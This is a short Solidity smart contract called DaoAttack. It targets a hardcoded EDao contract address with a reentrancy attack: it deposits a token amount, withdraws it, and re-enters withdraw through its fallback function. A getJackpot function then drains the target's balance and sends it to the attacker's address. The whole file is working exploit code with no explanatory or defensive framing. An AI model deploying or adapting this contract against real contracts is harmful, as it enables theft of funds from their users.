pragma solidity ^0.4.10;

contract DaoAttack {
    EDao public dao = EDao(0xe1fc92577c0ac7e5f1625cb74096861d1bb08bca);

    address owner;
    bool performAttack = true;


    function DaoAttack(){owner = msg.sender;}

    function attack() {
        dao.fundit.value(1)(this);
        dao.withdraw(1);
    }

    function() {
        if (performAttack) {
            performAttack = false;
            dao.withdraw(1);
        }}

    function getJackpot(){
        dao.withdraw(dao.balance);
        owner.send(this.balance);
    }
}
